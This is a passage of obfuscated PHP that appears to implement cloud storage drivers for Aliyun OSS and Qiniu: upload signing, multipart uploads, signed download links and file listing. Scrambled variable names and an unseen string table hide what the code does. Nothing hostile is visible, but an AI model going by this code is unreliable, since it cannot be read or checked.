$§ß¯îÎê[210] . $this->bucket . $§ß¯îÎê[10] . $ê£Ëß¤[1]; } public function uploadFormData($Âª—×Ó, $µ†Ô½Åı = 3600) { $×ÅŒğÈ =& $_SERVER[óÔë„ú]; if (!($ÄŠ—Æ‹› = $this->getHost())) { return !1; } $„úµø°ª = $µ†Ô½Åı; $çşâÏûù = date($×ÅŒğÈ[1473], time() + $„úµø°ª); $‚õ¢×áÓ = new DateTime($çşâÏûù); $¯‰®¯ÕË = $‚õ¢×áÓ->format(DateTime::ISO8601); $Ç¹Ãí’ä = strpos($¯‰®¯ÕË, $×ÅŒğÈ[372]); $¯‰®¯ÕË = substr($¯‰®¯ÕË, 0, $Ç¹Ãí’ä) . $×ÅŒğÈ[1474]; $ÒÒŠÙğ¼ = 1048576000 * 5; $Ú¡ÖàÂ = $this->pathFather($Âª—×Ó); $Ú“¯¤Ã– = array($×ÅŒğÈ[275] => $¯‰®¯ÕË, $×ÅŒğÈ[278] => array(array($×ÅŒğÈ[1475], 0, $ÒÒŠÙğ¼), array($×ÅŒğÈ[281], $×ÅŒğÈ[282], $Ú¡ÖàÂ))); $ä†öö££ = base64_encode(json_encode($Ú“¯¤Ã–)); $Ïüà¡å… = base64_encode(hash_hmac($×ÅŒğÈ[263], $ä†öö££, $this->secret, !0)); $ª®²ÑÊ± = array($×ÅŒğÈ[293] => $ä†öö££, $×ÅŒğÈ[1476] => $this->accessKey, $×ÅŒğÈ[285] => $×ÅŒğÈ[274], $×ÅŒğÈ[1477] => $Ïüà¡å…, $×ÅŒğÈ[208] => $ÄŠ—Æ‹›); $ª®²ÑÊ± = $this->trafficLimit($×ÅŒğÈ[1471], $ª®²ÑÊ±); return $ª®²ÑÊ±; } public function multiUploadFormData($Øˆé‘À, $½†©Ùğñ = 3600) { $å×´°ˆ =& $_SERVER[óÔë„ú]; if (!($áòÓÄÔÔ = $this->getHost())) { return !1; } $‘à¢°® = $this->trafficLimit($å×´°ˆ[1471]); $¥íêØ¿€ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Øˆé‘À), $‘à¢°®); return array($å×´°ˆ[254] => $¥íêØ¿€, $å×´°ˆ[208] => $áòÓÄÔÔ . $å×´°ˆ[8] . $this->pathEncode($Øˆé‘À), $å×´°ˆ[255] => gmdate($å×´°ˆ[1478]), $å×´°ˆ[97] => $Øˆé‘À); } public function multiUploadAuthData($úÛ»¹üİ, $øµÕ‘Ä› = array()) { $´ŞÖÔ©å =& $_SERVER[óÔë„ú]; $ùÔÕĞ™Ô = isset($øµÕ‘Ä›[$´ŞÖÔ©å[255]]) ? $øµÕ‘Ä›[$´ŞÖÔ©å[255]] : gmdate($´ŞÖÔ©å[1478]); $¸ä²îÔ· = isset($øµÕ‘Ä›[$´ŞÖÔ©å[169]]) ? $øµÕ‘Ä›[$´ŞÖÔ©å[169]] : $´ŞÖÔ©å[12]; $ìåˆèÏ¶ = $úÛ»¹üİ; if (isset($øµÕ‘Ä›[$´ŞÖÔ©å[97]])) { $ìåˆèÏ¶ = $øµÕ‘Ä›[$´ŞÖÔ©å[97]]; unset($øµÕ‘Ä›[$´ŞÖÔ©å[97]]); } if (isset($øµÕ‘Ä›[$´ŞÖÔ©å[256]])) { $øµÕ‘Ä›[$´ŞÖÔ©å[255]] = $ùÔÕĞ™Ô; return $this->listUploadParts($ìåˆèÏ¶, $øµÕ‘Ä›); } $¨ÎùÃ›· = array($´ŞÖÔ©å[257], $´ŞÖÔ©å[12], $´ŞÖÔ©å[123], $ùÔÕĞ™Ô, "\x78\55\x6f\x73\x73\55\x64\x61\x74\145\x3a{$ùÔÕĞ™Ô}", $´ŞÖÔ©å[8] . $this->bucket . $´ŞÖÔ©å[8] . $ìåˆèÏ¶ . $¸ä²îÔ·); if (strpos($¸ä²îÔ·, $´ŞÖÔ©å[258]) === 0) { $¨ÎùÃ›·[0] = $´ŞÖÔ©å[259]; if ($ŸÂø®¸ = $this->trafficLimit($´ŞÖÔ©å[1471])) { $ìåˆèÏ¶ = $´ŞÖÔ©å[1479]; array_splice($¨ÎùÃ›·, 5, 0, $ìåˆèÏ¶ . $´ŞÖÔ©å[4] . $ŸÂø®¸[$ìåˆèÏ¶]); } } if (isset($øµÕ‘Ä›[$´ŞÖÔ©å[260]]) && $øµÕ‘Ä›[$´ŞÖÔ©å[260]] == $´ŞÖÔ©å[261]) { $¨ÎùÃ›·[0] = $´ŞÖÔ©å[261]; } if (!empty($øµÕ‘Ä›[$´ŞÖÔ©å[1480]])) { $ˆÀæà¹ = array_merge(array($¨ÎùÃ›·[4]), $øµÕ‘Ä›[$´ŞÖÔ©å[1480]]); sort($ˆÀæà¹); $¨ÎùÃ›·[4] = implode($´ŞÖÔ©å[262], $ˆÀæà¹); } $ò•Õ—š„ = implode($´ŞÖÔ©å[262], $¨ÎùÃ›·); $ıû•‹çş = base64_encode(hash_hmac($´ŞÖÔ©å[263], $ò•Õ—š„, $this->secret, !0)); $´»ƒ½Á° = $´ŞÖÔ©å[1448] . $this->accessKey . $´ŞÖÔ©å[4] . $ıû•‹çş; if (strpos($¸ä²îÔ·, $´ŞÖÔ©å[258]) === 0) { $´»ƒ½Á° = array($´ŞÖÔ©å[265] => $´»ƒ½Á°, $´ŞÖÔ©å[255] => $ùÔÕĞ™Ô); if ($ŸÂø®¸) { $´»ƒ½Á° = array_merge($´»ƒ½Á°, $ŸÂø®¸); } } return $´»ƒ½Á°; } public function listUploadParts($â±„‘éæ, $üïÆìèÈ) { $› Ì» ¾ =& $_SERVER[óÔë„ú]; $Óı‰Ü… = parse_url_query($üïÆìèÈ[$› Ì» ¾[169]]); $¹Ù¾«Ş = $this->client->listParts($this->bucket, $this->pathEncode($â±„‘éæ), $Óı‰Ü…[$› Ì» ¾[254]]); $¡ÍŠı›Œ = $¹Ù¾«Ş->getListPart(); $¼«âÔí´ = array(); foreach ($¡ÍŠı›Œ as $‡™¬Ö÷Ö) { $¼«âÔí´[] = array($› Ì» ¾[308] => $‡™¬Ö÷Ö->getPartNumber(), $› Ì» ¾[309] => trim($‡™¬Ö÷Ö->getETag(), $› Ì» ¾[121])); } unset($üïÆìèÈ[$› Ì» ¾[256]], $üïÆìèÈ[$› Ì» ¾[260]]); $Ò¼­ş®‘ = $this->multiUploadAuthData($â±„‘éæ, $üïÆìèÈ); if (empty($Ò¼­ş®‘)) { return !1; } return array($› Ì» ¾[265] => $Ò¼­ş®‘, $› Ì» ¾[255] => $üïÆìèÈ[$› Ì» ¾[255]], $› Ì» ¾[267] => $¼«âÔí´); } public function download($Ù²ı”Á´, $éßò¦à) { $“¼¿¦Õ =& $_SERVER[óÔë„ú]; if ($this->isFolder($Ù²ı”Á´)) { return !1; } try { $’„…şøİ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $éßò¦à); $’„…şøİ = $this->trafficLimit($“¼¿¦Õ[112], $’„…şøİ); $this->client->getObject($this->bucket, $this->pathEncode($Ù²ı”Á´), $’„…şøİ); } catch (OSS\Core\OssException $ëâõ’µè) { $this->writeLog(__FUNCTION__ . $“¼¿¦Õ[214] . $ëâõ’µè->getMessage()); return !1; } return $éßò¦à; } public function fileSubstr($ïâ¢Ç±€, $¹„Ğß£– = 0, $Ÿ²‰¢¨‹ = false) { if ($¹„Ğß£– === -1) { $ë­øŸàÖ = array(); } else { if ($Ÿ²‰¢¨‹ === !1) { $­ùÚ°æ = $this->size($ïâ¢Ç±€); } else { $­ùÚ°æ = $¹„Ğß£– + $Ÿ²‰¢¨‹ - 1; } $ë­øŸàÖ = array(OSS\OssClient::OSS_RANGE => "{$¹„Ğß£–}\55{$­ùÚ°æ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ïâ¢Ç±€), $ë­øŸàÖ); } catch (OSS\Core\OssException $‰ì¬º­•) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][214] . $‰ì¬º­•->getMessage()); think_exception($‰ì¬º­•->getMessage()); return !1; } } private function trafficLimit($œ‰£¾†¶, $ñÛŸÖÑÃ = array()) { $«È¢©í =& $_SERVER[óÔë„ú]; if ($œ‰£¾†¶ == $«È¢©í[1471] && $this->isUploadServer() || $œ‰£¾†¶ == $«È¢©í[112] && $this->isFileOutServer()) { return $ñÛŸÖÑÃ; } $”Ëûí”İ = floatval($GLOBALS[$«È¢©í[6]][$«È¢©í[92]][$«È¢©í[110]][$œ‰£¾†¶]) * 1024 * 1024 * 8; if (!$”Ëûí”İ) { return $ñÛŸÖÑÃ; } $”Ëûí”İ = $”Ëûí”İ < 819200 ? 819200 : ($”Ëûí”İ > 838860800 ? 838860800 : $”Ëûí”İ); $ñÛŸÖÑÃ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($”Ëûí”İ); return $ñÛŸÖÑÃ; } public function link($ÛıšÇÊÈ, $—Ë¸öµ¨ = array()) { $ˆñÎµ‡Ù =& $_SERVER[óÔë„ú]; if (!$this->exist($ÛıšÇÊÈ) || $this->isFolder($ÛıšÇÊÈ)) { return !1; } try { $—Ë¸öµ¨ = $this->trafficLimit($ˆñÎµ‡Ù[112], $—Ë¸öµ¨); $¿Ÿ²ıº¼ = $this->client->signUrl($this->bucket, $this->pathEncode($ÛıšÇÊÈ), 3600 * 12, $ˆñÎµ‡Ù[261], $—Ë¸öµ¨); return $this->getCdnLink($¿Ÿ²ıº¼); } catch (OSS\Core\OssException $Ç³û½) { $this->writeLog(__FUNCTION__ . $ˆñÎµ‡Ù[214] . $Ç³û½->getMessage()); return !1; } } public function fileOut($–‚éÕåº, $¸ğëĞÁ = false, $™ÔƒİÀ = false, $ÜÙààâÔ = '') { $«ªšŸŠ¼ =& $_SERVER[óÔë„ú]; if ($this->isFileOutServer()) { return $this->fileOutServer($–‚éÕåº, $¸ğëĞÁ, $™ÔƒİÀ, $ÜÙààâÔ); } if (!$™ÔƒİÀ) { $™ÔƒİÀ = $this->pathThis($–‚éÕåº); } $™ÔƒİÀ = rawurlencode($™ÔƒİÀ); $Œà¶Æ¥¸ = get_file_mime(get_path_ext($™ÔƒİÀ)); if ($Œà¶Æ¥¸ == $«ªšŸŠ¼[248]) { return parent::fileOut($–‚éÕåº, $¸ğëĞÁ, $™ÔƒİÀ, $ÜÙààâÔ); } $¸ğëĞÁ = $¸ğëĞÁ ? $«ªšŸŠ¼[1481] : $«ªšŸŠ¼[1482]; $ß”‚Ùæ‚ = array(OSS\OssClient::OSS_SUB_RESOURCE => $«ªšŸŠ¼[1483] . rawurlencode("{$¸ğëĞÁ}\73\x66\x69\x6c\x65\156\141\x6d\x65\x3d{$™ÔƒİÀ}")); $ß”‚Ùæ‚[OSS\OssClient::OSS_SUB_RESOURCE] .= $«ªšŸŠ¼[1484] . rawurlencode($Œà¶Æ¥¸); $Ó“·œÛ = $this->link($–‚éÕåº, $ß”‚Ùæ‚); $this->fileOutLink($Ó“·œÛ); } public function fileOutServer($§ôŒ¡ù, $ÃÍß²² = false, $ĞÜ†×¯— = false, $£î…ŒáÚ = '') { parent::fileOut($§ôŒ¡ù, $ÃÍß²², $ĞÜ†×¯—, $£î…ŒáÚ); } public function fileOutImage($Î†éôÌè, $Ì“ÆË¯ = 250) { if ($this->size($Î†éôÌè) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Î†éôÌè, $Ì“ÆË¯); } $Ğ·÷éÇğ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[óÔë„ú][1445] . $Ì“ÆË¯); $Ü¾‘şéı = $this->link($Î†éôÌè, $Ğ·÷éÇğ); $this->fileOutLink($Ü¾‘şéı); } public function fileOutImageServer($¼‰…¶¢, $³Ç³¦„Ã = 250) { parent::fileOutImage($¼‰…¶¢, $³Ç³¦„Ã); } public function fileOutLink($®ìÃÜµè) { $¯Â©ò‘ =& $_SERVER[óÔë„ú]; if (!$this->isCdnHost() && substr($®ìÃÜµè, 0, 7) == $¯Â©ò‘[313]) { $®ìÃÜµè = $¯Â©ò‘[314] . substr($®ìÃÜµè, 7); } header($¯Â©ò‘[175] . $®ìÃÜµè); die; } public function hashMd5($¤é´½Ù, $íØâæÄ = '') { $›áŸß¼ =& $_SERVER[óÔë„ú]; $À¾ğç = $this->_objectMeta($¤é´½Ù); if (!$À¾ğç) { return $›áŸß¼[12]; } if (!isset($À¾ğç[$›áŸß¼[1465]]) && !empty($íØâæÄ)) { $–Ğàíëæ = $this->updateObjMeta($¤é´½Ù, array($›áŸß¼[1465] => $íØâæÄ)); $À¾ğç[$›áŸß¼[1465]] = $–Ğàíëæ ? $íØâæÄ : $›áŸß¼[12]; } return isset($À¾ğç[$›áŸß¼[1465]]) ? strtolower($À¾ğç[$›áŸß¼[1465]]) : $›áŸß¼[12]; } public function size($æÚï¶Úî) { $›¸€ëñ = $this->objectMeta($æÚï¶Úî); return $›¸€ëñ ? $›¸€ëñ[$_SERVER[óÔë„ú][79]] : 0; } public function info($¦Ş§¸Î×) { if ($this->isFolder($¦Ş§¸Î×)) { return $this->folderInfo($¦Ş§¸Î×); } else { if ($this->isFile($¦Ş§¸Î×)) { return $this->fileInfo($¦Ş§¸Î×); } } return !1; } public function exist($©†µº) { return $this->isFile($©†µº) || $this->isFolder($©†µº); } public function isFile($†ˆ¢Ã) { return !$this->isFolder($†ˆ¢Ã) && $this->objectMeta($†ˆ¢Ã); } public function isFolder($ä¶ÉÂÊ) { return $this->cacheMethod($_SERVER[óÔë„ú][179], $ä¶ÉÂÊ); } protected function objectMeta($ı­¶±Ğ») { return $this->cacheMethod($_SERVER[óÔë„ú][181], $ı­¶±Ğ»); } protected function _objectMeta($ôœúğÙ£) { $ë†Ï°§Ó =& $_SERVER[óÔë„ú]; try { $‹ïê¾‚ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ôœúğÙ£)); } catch (OSS\Core\OssException $ÄÜ‰®„Æ) { $this->writeLog(__FUNCTION__ . $ë†Ï°§Ó[214] . $ÄÜ‰®„Æ->getMessage()); $‹ïê¾‚ = !1; } if ($‹ïê¾‚) { $‹ïê¾‚[$ë†Ï°§Ó[79]] = intval($‹ïê¾‚[$ë†Ï°§Ó[1463]]); } return $‹ïê¾‚; } protected function _isFolder($À–èÙ÷) { $Êí›àú =& $_SERVER[óÔë„ú]; if ($À–èÙ÷ == $Êí›àú[12] || $À–èÙ÷ == $Êí›àú[8]) { return !0; } $ÜÛöíˆ = array($Êí›àú[1458] => $Êí›àú[8], $Êí›àú[1459] => rtrim($À–èÙ÷, $Êí›àú[8]) . $Êí›àú[8], $Êí›àú[1460] => 1, $Êí›àú[1461] => $Êí›àú[12]); $„ï¦·¬ˆ = $this->client->listObjects($this->bucket, $ÜÛöíˆ); if ($„ï¦·¬ˆ->getObjectList() || $„ï¦·¬ˆ->getPrefixList()) { return !0; } return !1; } public function writeLog($õÔô¸¡Ã = '', $ëÖÜ…„£ = false) { $“¬İ–½ò =& $_SERVER[óÔë„ú]; $¢é»˜É¦ = in_array(ACTION, array($“¬İ–½ò[212], $“¬İ–½ò[213])); if (!$¢é»˜É¦ && !GLOBAL_DEBUG) { return; } $«ÇøÊ©ğ = 0; if (stripos($õÔô¸¡Ã, $“¬İ–½ò[1485]) !== !1) { $«ÇøÊ©ğ = 1; $ŠšÚ¤çº = explode($“¬İ–½ò[1486], $õÔô¸¡Ã); $õÔô¸¡Ã = !empty($ŠšÚ¤çº[1]) ? $ŠšÚ¤çº[1] : $õÔô¸¡Ã; } else { if (stripos($õÔô¸¡Ã, $“¬İ–½ò[1487])) { $«ÇøÊ©ğ = 2; $ŠšÚ¤çº = explode($“¬İ–½ò[1487], $õÔô¸¡Ã); $ŠšÚ¤çº = explode($“¬İ–½ò[4], $ŠšÚ¤çº[0]); $õÔô¸¡Ã = !empty($ŠšÚ¤çº[1]) ? $ŠšÚ¤çº[1] : $õÔô¸¡Ã; } } if ($¢é»˜É¦ && I18n::getType() == $“¬İ–½ò[1488]) { if ($«ÇøÊ©ğ == 1) { $õÔô¸¡Ã = str_replace($“¬İ–½ò[1489], $“¬İ–½ò[1490], $õÔô¸¡Ã); } else { if ($«ÇøÊ©ğ == 2) { $ŠšÚ¤çº = explode($“¬İ–½ò[214], $ŠšÚ¤çº[0]); $ü™Ü½âÅ = isset($ŠšÚ¤çº[1]) ? $ŠšÚ¤çº[1] : $“¬İ–½ò[12]; $ÖŞº¡· = array($“¬İ–½ò[1491] => $“¬İ–½ò[1492], $“¬İ–½ò[1493] => $“¬İ–½ò[1494], $“¬İ–½ò[1495] => $“¬İ–½ò[1496], $“¬İ–½ò[1497] => $“¬İ–½ò[1498], $“¬İ–½ò[1499] => $“¬İ–½ò[1500], $“¬İ–½ò[1501] => $“¬İ–½ò[1502], $“¬İ–½ò[1503] => $“¬İ–½ò[1504], $“¬İ–½ò[1505] => $“¬İ–½ò[1506], $“¬İ–½ò[1507] => $“¬İ–½ò[1508], $“¬İ–½ò[1509] => $“¬İ–½ò[1510]); if (isset($ÖŞº¡·[$ü™Ü½âÅ])) { $õÔô¸¡Ã = $ÖŞº¡·[$ü™Ü½âÅ]; } } } if (stripos($õÔô¸¡Ã, $“¬İ–½ò[1511])) { $õÔô¸¡Ã = $“¬İ–½ò[1512]; } } if (!trim($õÔô¸¡Ã)) { return; } parent::writeLog(trim($õÔô¸¡Ã), $ëÖÜ…„£); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($²ëí Äı) { parent::__construct(); require_once SDK_DIR . $_SERVER[óÔë„ú][1513]; $this->_init($²ëí Äı); } public function _init($ŒÀüÁ­Ú) { $ú‚Œƒì­ =& $_SERVER[óÔë„ú]; $this->config = $ŒÀüÁ­Ú; foreach ($ŒÀüÁ­Ú as $¶æÕû³¿ => $æßËôø) { if (isset($this->{$¶æÕû³¿})) { $this->{$¶æÕû³¿} = $æßËôø; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ú‚Œƒì­[1514] . LNG($ú‚Œƒì­[1449])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÆÆÇ¶Öá, $Šáù°Æ = '', $ŸÅ‹¨€— = REPEAT_RENAME) { if ($this->setContent($ÆÆÇ¶Öá, $Šáù°Æ)) { return $this->getPathOuter($ÆÆÇ¶Öá); } return !1; } public function mkdir($ÙÄÃÖı³, $³ÀÍé£ = REPEAT_SKIP) { $Ñğ˜ŠÓ’ =& $_SERVER[óÔë„ú]; $ô·‚±‡ˆ = trim($ÙÄÃÖı³, $Ñğ˜ŠÓ’[8]); if ($this->_isFolder($ô·‚±‡ˆ)) { return $this->getPathOuter($ô·‚±‡ˆ); } $ÙÄÃÖı³ = $ô·‚±‡ˆ . $Ñğ˜ŠÓ’[8]; $ÙÎÄ›ŸÓ = get_path_this($ô·‚±‡ˆ); $äèÏ»İæ = $ÙÄÃÖı³ . $ÙÎÄ›ŸÓ; if (!$this->mkfile($äèÏ»İæ)) { return !1; } if (!$this->moveFile($äèÏ»İæ, $ÙÄÃÖı³)) { $this->delFile($äèÏ»İæ); return !1; } return $this->getPathOuter($ô·‚±‡ˆ); } public function copyFile($ªç¯°¼Ñ, $¨—ÀÇ–Ş) { $¶«¼ó²Ù = $this->bucketManager->copy($this->bucket, $ªç¯°¼Ñ, $this->bucket, $¨—ÀÇ–Ş, !0); return $¶«¼ó²Ù ? !1 : $this->getPathOuter($¨—ÀÇ–Ş); } public function moveFile($Ô§ëíŒ, $Ş¬¸ÜÔ) { $éç¬¢” = $this->bucketManager->move($this->bucket, $Ô§ëíŒ, $this->bucket, $Ş¬¸ÜÔ, !0); return $éç¬¢” ? !1 : $this->getPathOuter($Ş¬¸ÜÔ); } public function delFile($¤‡ã­¦) { if (!$this->exist($¤‡ã­¦)) { return !0; } $çÕ”´ı¨ = $this->bucketManager->delete($this->bucket, $¤‡ã­¦); return $çÕ”´ı¨ ? !1 : !0; } public function delFolder($¥Ï€Ëùç) { $ì ÏŒÎÜ =& $_SERVER[óÔë„ú]; if (!$this->exist($¥Ï€Ëùç)) { return !0; } $this->listItemCache = !1; $—úÈÜ = $this->fileList($¥Ï€Ëùç); $this->listItemCache = !0; $¼Ò òµ = trim($¥Ï€Ëùç, $ì ÏŒÎÜ[8]) . $ì ÏŒÎÜ[8]; if (!empty($¥Ï€Ëùç) && $¥Ï€Ëùç !== $ì ÏŒÎÜ[228] && !in_array($¼Ò òµ, $—úÈÜ[$ì ÏŒÎÜ[85]])) { $—úÈÜ[$ì ÏŒÎÜ[85]][] = $¼Ò òµ; } $şò†²Úˆ = $this->delByBatch($—úÈÜ[$ì ÏŒÎÜ[86]]); if (!$şò†²Úˆ) { return !1; } $şò†²Úˆ = $this->delByBatch($—úÈÜ[$ì ÏŒÎÜ[85]]); if (!$şò†²Úˆ) { return !1; } return $this->delFile($¼Ò òµ); } private function delByBatch($¿ö°“Æ) { foreach (array_chunk($¿ö°“Æ, 1000) as $ÉéØªÅ) { $½ûúà¨Ô = $this->bucketManager->buildBatchDelete($this->bucket, $ÉéØªÅ); list($Ÿñæß˜À, $ç“öŞñ) = $this->bucketManager->batch($½ûúà¨Ô); if ($ç“öŞñ) { return !1; } } return !0; } public function rename($¼ºâÄÎŞ, $ÁäÎõ–é) { return $this->renameObject($¼ºâÄÎŞ, $ÁäÎõ–é); } public function fileInfo($­üö°ë½, $½í”˜Ñ = false, $™“Æãšò = array()) { $çÄºÌ¶ =& $_SERVER[óÔë„ú]; $Ô»ªæ¡¸ = array($çÄºÌ¶[32] => $this->pathThis($­üö°ë½), $çÄºÌ¶[87] => $this->getPathOuter($çÄºÌ¶[8] . $­üö°ë½), $çÄºÌ¶[33] => $çÄºÌ¶[230], $çÄºÌ¶[79] => isset($™“Æãšò[$çÄºÌ¶[1515]]) ? $™“Æãšò[$çÄºÌ¶[1515]] : 0, $çÄºÌ¶[169] => $this->ext($­üö°ë½)); if ($½í”˜Ñ) { return $Ô»ªæ¡¸; } $Ô»ªæ¡¸[$çÄºÌ¶[231]] = $Ô»ªæ¡¸[$çÄºÌ¶[88]] = 0; $Ô»ªæ¡¸[$çÄºÌ¶[232]] = $Ô»ªæ¡¸[$çÄºÌ¶[233]] = !0; if (empty($™“Æãšò)) { $™“Æãšò = $this->objectMeta($­üö°ë½); if (!$™“Æãšò) { return $Ô»ªæ¡¸; } } if (isset($™“Æãšò[$çÄºÌ¶[234]]) && $™“Æãšò[$çÄºÌ¶[234]]) { $Ô»ªæ¡¸[$çÄºÌ¶[235]] = $™“Æãšò[$çÄºÌ¶[234]]; } if (isset($™“Æãšò[$çÄºÌ¶[245]]) && $™“Æãšò[$çÄºÌ¶[245]]) { $Ô»ªæ¡¸[$çÄºÌ¶[235]] = $™“Æãšò[$çÄºÌ¶[245]]; } if (isset($™“Æãšò[$çÄºÌ¶[1516]])) { $Ô»ªæ¡¸[$çÄºÌ¶[88]] = substr($™“Æãšò[$çÄºÌ¶[1516]] . $çÄºÌ¶[12], 0, 10); } if (isset($™“Æãšò[$çÄºÌ¶[1515]])) { $Ô»ªæ¡¸[$çÄºÌ¶[79]] = $™“Æãšò[$çÄºÌ¶[1515]]; } return $Ô»ªæ¡¸; } public function folderInfo($“  Áì›, $²»½’îù = false) { $¤ åáÖŞ =& $_SERVER[óÔë„ú]; $êÒ¡şÇ— = array($¤ åáÖŞ[32] => $this->pathThis($“  Áì›), $¤ åáÖŞ[87] => $this->getPathOuter($¤ åáÖŞ[8] . $“  Áì›), $¤ åáÖŞ[33] => $¤ åáÖŞ[78]); if ($²»½’îù) { return $êÒ¡şÇ—; } $êÒ¡şÇ—[$¤ åáÖŞ[231]] = $êÒ¡şÇ—[$¤ åáÖŞ[88]] = 0; $êÒ¡şÇ—[$¤ åáÖŞ[232]] = $êÒ¡şÇ—[$¤ åáÖŞ[233]] = !0; $“  Áì› = rtrim($“  Áì›, $¤ åáÖŞ[8]) . $¤ åáÖŞ[8]; $§Ô¹¾ü• = $this->objectMeta($“  Áì›); if (isset($§Ô¹¾ü•[$¤ åáÖŞ[1516]])) { $êÒ¡şÇ—[$¤ åáÖŞ[88]] = substr($§Ô¹¾ü•[$¤ åáÖŞ[1516]] . $¤ åáÖŞ[12], 0, 10); } return $êÒ¡şÇ—; } public function listPath($İ·àÄœ, $ñ¤ˆÁ“ = false) { $ØŠõ»£ß =& $_SERVER[óÔë„ú]; $Íş›¥­ï = $this->fileList($İ·àÄœ, $ØŠõ»£ß[8], !0); foreach ($Íş›¥­ï[$ØŠõ»£ß[85]] as $€¢ƒ“»À => $ôº–šä) { $Íş›¥­ï[$ØŠõ»£ß[85]][$€¢ƒ“»À] = $this->folderInfo($ôº–šä, $ñ¤ˆÁ“); } foreach ($Íş›¥­ï[$ØŠõ»£ß[86]] as $€¢ƒ“»À => $ôº–šä) { $Íş›¥­ï[$ØŠõ»£ß[86]][$€¢ƒ“»À] = $this->fileInfo($ôº–šä[$ØŠõ»£ß[97]], $ñ¤ˆÁ“, $ôº–šä); } return $Íş›¥­ï; } public function has($ÉĞøºáª, $Ã¯ˆ­Î = false, $™ƒ±¶£ = true) { $â¹Û€ =& $_SERVER[óÔë„ú]; $ÉĞøºáª = trim($ÉĞøºáª, $â¹Û€[8]); $™ü±í = empty($ÉĞøºáª) && $ÉĞøºáª !== $â¹Û€[228] ? $â¹Û€[12] : $ÉĞøºáª . $â¹Û€[8]; $Â½ğÉÛ = $â¹Û€[12]; $°İ×Ò = 500; $ÚõÎº‰í = $â¹Û€[8]; $ó®ùù‘ = $¯˜ßíü— = 0; while (!0) { check_abort(); list($îôŠò¼§, $îôÏˆÎ§) = $this->bucketManager->listFiles($this->bucket, $™ü±í, $Â½ğÉÛ, $°İ×Ò, $ÚõÎº‰í); if ($îôÏˆÎ§) { break; } $Â½ğÉÛ = array_key_exists($â¹Û€[1461], $îôŠò¼§) ? $Â½ğÉÛ = $îôŠò¼§[$â¹Û€[1517]] : $â¹Û€[12]; if ($Ã¯ˆ­Î) { if (!empty($îôŠò¼§[$â¹Û€[1518]])) { $ó®ùù‘ += count($îôŠò¼§[$â¹Û€[1518]]); } if (!empty($îôŠò¼§[$â¹Û€[1519]])) { $¯˜ßíü— += count($îôŠò¼§[$â¹Û€[1519]]); } if ($Â½ğÉÛ === $â¹Û€[12]) { break; } continue; } if ($™ƒ±¶£) { if (!empty($îôŠò¼§[$â¹Û€[1518]])) { return !0; } } else { if (!empty($îôŠò¼§[$â¹Û€[1519]])) { return !0; } } if ($Â½ğÉÛ === $â¹Û€[12]) { break; } } if ($Ã¯ˆ­Î) { return array($â¹Û€[239] => $ó®ùù‘, $â¹Û€[240] => $¯˜ßíü—); } return !1; } public function listAll($ì†×Î‹·) { $ƒ‰¡šŒ =& $_SERVER[óÔë„ú]; $Òñ­Ğ—õ = $this->fileList($ì†×Î‹·, $ƒ‰¡šŒ[12], !0); $ÀşÆü«± = array_to_keyvalue($Òñ­Ğ—õ[$ƒ‰¡šŒ[86]], $ƒ‰¡šŒ[32]); foreach ($Òñ­Ğ—õ[$ƒ‰¡šŒ[85]] as $ÚÈÚ¶”) { if (is_string($ÚÈÚ¶”)) { $ÀşÆü«±[$ÚÈÚ¶”] = array($ƒ‰¡šŒ[79] => 0); } } return $this->listAllFiles($ì†×Î‹·, $ÀşÆü«±); } private function fileList($úÚˆàóŞ, $ç©ÍèÂÊ = '', $ğÓ«† = 0) { $œ„–ûÈÛ =& $_SERVER[óÔë„ú]; $úÚˆàóŞ = trim($úÚˆàóŞ, $œ„–ûÈÛ[8]); $óÇß¼î• = empty($úÚˆàóŞ) && $úÚˆàóŞ !== $œ„–ûÈÛ[228] ? $œ„–ûÈÛ[12] : $úÚˆàóŞ . $œ„–ûÈÛ[8]; $»–ùô¸é = $œ„–ûÈÛ[12]; $ÈïÎëâ† = 1000; $©œòñÅ¾ = $½»»“ÈÌ = array(); while (!0) { check_abort(); list($°Øòƒä, $¤Éå›ÆÀ) = $this->bucketManager->listFiles($this->bucket, $óÇß¼î•, $»–ùô¸é, $ÈïÎëâ†, $ç©ÍèÂÊ); if ($¤Éå›ÆÀ) { break; } $»–ùô¸é = array_key_exists($œ„–ûÈÛ[1461], $°Øòƒä) ? $»–ùô¸é = $°Øòƒä[$œ„–ûÈÛ[1517]] : $œ„–ûÈÛ[12]; $¥†×ë = isset($°Øòƒä[$œ„–ûÈÛ[1518]]) ? $°Øòƒä[$œ„–ûÈÛ[1518]] : array(); $šì¸âòó = isset($°Øòƒä[$œ„–ûÈÛ[1519]]) ? $°Øòƒä[$œ„–ûÈÛ[1519]] : array(); foreach ($¥†×ë as $ëê”Ğáó) { if ($ëê”Ğáó[$œ„–ûÈÛ[97]] == $óÇß¼î•) { continue; } $Ë³Åß¹ = $ëê”Ğáó[$œ„–ûÈÛ[97]]; $¥ò·ÑÛÅ = $ëê”Ğáó[$œ„–ûÈÛ[1515]]; $ëê”Ğáó[$œ„–ûÈÛ[79]] = $¥ò·ÑÛÅ; $ğïÓ¡¯ = $¥ò·ÑÛÅ == 0 && substr($Ë³Åß¹, strlen($Ë³Åß¹) - 1, 1) == $œ„–ûÈÛ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ë³Åß¹, $ğïÓ¡¯, $ëê”Ğáó); if ($ğïÓ¡¯) { $©œòñÅ¾[] = $Ë³Åß¹; continue; } $½»»“ÈÌ[] = $ğÓ«† ? 